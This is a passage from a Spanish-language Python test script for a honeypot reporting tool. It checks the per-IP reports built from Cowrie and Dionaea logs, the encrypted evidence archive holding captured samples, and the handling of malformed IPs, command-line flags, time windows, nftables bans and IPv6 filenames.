        comprueba("se crea uno y solo uno", 1, len(tars))
        tar_enc = os.path.join(CASA, tars[0])
        comprueba("NO queda ningun archivo sin cifrar en la carpeta", [],
                  [f for f in os.listdir(CASA)
                   if f.endswith((".tar", ".tar.gz", ".tgz"))])
        with open(tar_enc, "rb") as fh:
            cabeza = fh.read(8)
        comprueba("va cifrado de verdad (cabecera de openssl)", b"Salted__",
                  cabeza)
        try:
            tarfile.open(tar_enc)
            abre_sin_clave = True
        except Exception:                                  # noqa: BLE001
            abre_sin_clave = False
        comprueba("y no se abre como tar sin descifrarlo", False,
                  abre_sin_clave)

        claro = os.path.join(TMP, "descifrado.tar.gz")
        r = subprocess.run(["openssl", "enc", "-d", "-aes-256-cbc", "-pbkdf2",
                            "-in", tar_enc, "-k", "1234", "-out", claro],
                           capture_output=True)
        comprueba("con 1234 se descifra", 0, r.returncode)
        dentro = {}
        with tarfile.open(claro) as tar:
            for m in tar.getmembers():
                dentro[m.name.split("/", 1)[1] if "/" in m.name else m.name] = m
        for pieza in ("FICHA.txt", "LEEME.txt", "eventos-cowrie.json",
                      "reporter.txt", "dionaea.txt", "urls.txt", "hashes.txt",
                      "nftables.txt", "binarios/cowrie/" + SHA,
                      "binarios/dionaea/" + SHA_SMB, "terminal/" + GRABACION):
            cierto("dentro va %s" % pieza, pieza in dentro)
        with tarfile.open(claro) as tar:
            capturado = tar.extractfile(
                [m for m in tar.getmembers()
                 if m.name.endswith("binarios/cowrie/" + SHA)][0]).read()
            leeme = tar.extractfile(
                [m for m in tar.getmembers()
                 if m.name.endswith("LEEME.txt")][0]).read().decode("utf-8")
        comprueba("la muestra llega byte a byte como se capturo", MUESTRA,
                  capturado)
        # LA EVIDENCIA NO SE TOCA. En el .txt lo que no era texto sale marcado
        # para poder leerlo; aqui la linea tiene que estar TAL CUAL la escribio
        # Cowrie, porque es lo que se puede volver a comprobar contra el log.
        with tarfile.open(claro) as tar:
            crudo = tar.extractfile(
                [m for m in tar.getmembers()
                 if m.name.endswith("eventos-cowrie.json")][0]).read()
        cierto("el json crudo conserva la linea como la escribio Cowrie",
               b"\\ufffd$h" in crudo)
        comprueba("y no lleva las marcas de la copia para leer", False,
                  b"<?>" in crudo)
        cierto("el LEEME dice la contrasena", "1234" in leeme)
        cierto("y dice por que va cifrada (el antivirus)",
               "cuarentena" in leeme)
        comprueba("las muestras van sin permiso de ejecucion", 0o600,
                  dentro["binarios/cowrie/" + SHA].mode)

    # =====================================================================
    print()
    print("Lo que NO se escribe")
    vacio = os.path.join(TMP, "vacio")
    os.makedirs(vacio)
    codigo, pantalla = correr("8.8.8.8", salida=vacio)
    comprueba("una IP de la que no hay nada sale con error", 1, codigo)
    comprueba("y NO deja un fichero vacio detras", [], os.listdir(vacio))
    cierto("lo dice en pantalla", "no hay NADA" in pantalla)

    # Una IP a medias o con un numero imposible tambien se rechaza: se cuelan en
    # un copiar y pegar de un aviso y son las que mas tarde se notan.
    for malo in ("esto-no-es-una-ip", "192.168.X.Y", "198.51.100", "8.8.8.8.8",
                 "198.51.100.999", "198.51.100.23 y algo mas"):
        codigo, pantalla = correr(malo, salida=vacio)
        comprueba("se rechaza %r" % malo, 2, codigo)
    comprueba("y NO escribe nada por el camino", [], os.listdir(vacio))
    # La presentacion son siete lineas: por delante de un error de una, lo
    # esconden. Se comprueba el ORDEN, que es lo unico que hay que mantener.
    codigo, pantalla = correr("192.168.X.Y", salida=vacio)
    comprueba("y sin la presentacion por delante", False,
              "la ficha de UNA IP" in pantalla)
    cierto("pero diciendo como se escribe una IP",
           "198.51.100.23" in pantalla)
    # Un argumento VACIO no es una IP mal escrita: es no haber dado ninguna, y
    # entonces pregunta. Aqui no hay nadie contestando, asi que se despide.
    codigo, pantalla = correr("", salida=vacio)
    comprueba("un argumento vacio es como no dar ninguno: pregunta", 0, codigo)
    cierto("y si no hay quien conteste, se despide sin hacer nada",
           "Nada que hacer" in pantalla)

    # Una maquina que no es la del senuelo: ni logs ni base. No se inventa una
    # ficha vacia, y lo primero que dice es lo que suele ser ---que falta el
    # sudo--- porque un volumen de Docker en 0700 no se puede ni listar.
    otro_cfg = os.path.join(TMP, "config-vacio.ini")
    with open(otro_cfg, "w", encoding="utf-8") as fh:
        fh.write("[paths]\ncowrie_log_dir = %s\ndionaea_sqlite = %s\n"
                 % (os.path.join(TMP, "no-hay"), os.path.join(TMP, "tampoco")))
    guardado = CFG
    try:
        globals()["CFG"] = otro_cfg
        codigo, pantalla = correr(IP, salida=vacio)
    finally:
        globals()["CFG"] = guardado
    comprueba("sin nada que leer, no se inventa una ficha", 2, codigo)
    cierto("y dice donde ha mirado", "no hay ni logs de Cowrie" in pantalla)

    sin_tar = os.path.join(TMP, "sin-tar")
    os.makedirs(sin_tar)
    codigo, pantalla = correr(IP, salida=sin_tar, responde="\n\nn\n")
    comprueba("diciendo que no al tar, sale bien", 0, codigo)
    comprueba("y escribe la ficha y nada mas", 1, len(os.listdir(sin_tar)))
    cierto("y lo dice en pantalla", "has dicho que no lo querias" in pantalla)

    print()
    print("Y no hay parametros: lo que hay que decidir se pregunta")
    # Esto no es un capricho de estilo. Una opcion en la linea de ordenes es una
    # opcion que hay que recordar, y a las tres de la manana no se recuerda: se
    # teclea mal, sale un error, y se deja de mirar la IP. Si alguien la teclea
    # por costumbre, se le dice donde esta ahora esa decision.
    for parametro in ("--dias", "--sin-tar", "--todo", "-h", "--help"):
        codigo, pantalla = correr(IP, parametro, salida=vacio)
        comprueba("%s se rechaza" % parametro, 2, codigo)
        cierto("y dice que eso se pregunta (%s)" % parametro,
               "no lleva parametros" in pantalla and "pregunta" in pantalla)
    codigo, pantalla = correr(IP, "8.8.8.8", salida=vacio)
    comprueba("dos IPs a la vez tambien se rechazan", 2, codigo)
    cierto("diciendo cual sobra", "sobra 8.8.8.8" in pantalla)
    comprueba("y nada de eso escribe un fichero", [], os.listdir(vacio))

    print()
    print("La ventana de tiempo, que tambien se pregunta")
    ventana = os.path.join(TMP, "ventana")
    os.makedirs(ventana)
    codigo, _p = correr(IP, salida=ventana, nft=NFT_ROTO, responde="2\n")
    comprueba("sale bien", 0, codigo)
    texto2 = io.open(la_ficha(ventana), encoding="utf-8").read()
    cierto("la cabecera dice la ventana que se pidio",
           "ultimos 2 dia(s)" in texto2)
    comprueba("lo de hace cinco dias se queda fuera", False,
              "2026-09-24" in texto2)
    cierto("y lo de la ventana entra", "2026-09-28" in texto2)
    cierto("si nft falla, no revienta y dice que no esta baneada",
           "no esta en el cortafuegos" in texto2)

    print()
    print("Una IPv6")
    seis = os.path.join(TMP, "seis")
    os.makedirs(seis)
    codigo, _p = correr(IP6, salida=seis, nft=NFT_BUENO, fichero_nft=SET_BAN6)
    comprueba("sale bien", 0, codigo)
    nombres = os.listdir(seis)
    # En Windows un ":" no es un nombre de fichero valido, y ahi es donde se
    # acaba bajando esto.
    comprueba("no deja ningun ':' en el nombre del fichero", [],
              [n for n in nombres if ":" in n])
    cierto("el nombre sigue diciendo de quien es la ficha",
           any("2001-db8--dead-1" in n for n in nombres))
    texto3 = io.open(os.path.join(seis, sorted(
        n for n in nombres if n.endswith(".txt"))[0]), encoding="utf-8").read()
    cierto("y la reconoce baneada aunque el kernel la escriba sin comprimir",
           "IP BANEADA COWRIE AUTOMATICO" in texto3)

finally:
    shutil.rmtree(TMP, ignore_errors=True)

print()
print("-------------------------------------")
print("ok: %d   fallos: %d" % (OK, MAL))
sys.exit(1 if MAL else 0)
